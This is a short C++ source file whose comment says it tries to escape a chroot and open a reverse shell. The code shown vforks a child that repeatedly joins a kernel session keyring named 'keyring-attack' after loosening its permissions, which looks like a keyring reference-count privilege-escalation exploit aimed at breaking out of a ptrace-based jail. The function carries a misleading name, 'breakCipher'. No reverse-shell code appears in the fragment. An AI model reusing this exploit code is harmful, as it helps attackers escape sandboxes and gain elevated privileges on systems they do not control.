/**
	attempts to escape chroot and then open a reverse shell
**/

#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <iostream>
#include <netinet/ip.h>
#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <syscall.h>


using namespace std;

void breakCipher(char *str) {
	//break out of the ptrace-based jail
	pid_t pid = vfork();
	if (pid < 0) {
		strcpy(str, "V1");
		return;
	}

	if (pid == 0) {
		//V1 child
		int serial;
		serial = syscall(SYS_keyctl, 0x1 /*KEYCTL_JOIN_SESSION_KEYRING*/, "keyring-attack");
		if (serial < 0) {
			cout << strerror(errno) << endl;
			_exit(0);
		}

		int ret = syscall(SYS_keyctl, 0x5 /*KEYCTL_SETPERM*/, serial, 0x3f3f0000);
		if (ret < 0) {
			cout << strerror(errno) << endl;
			_exit(0);
		}

		/*for (int i = 0; i < 100; i++) {*/
		while(true) {
			serial = syscall(SYS_keyctl, 0x1 /*KEYCTL_JOIN_SESSION_KEYRING*/, "keyring-attack");
			if (serial < 0) {
				cout << strerror(errno) << endl;
				_exit(0);
			}
		}

		_exit(0);
	}
	else {
		//V1 parent
	}
	
}
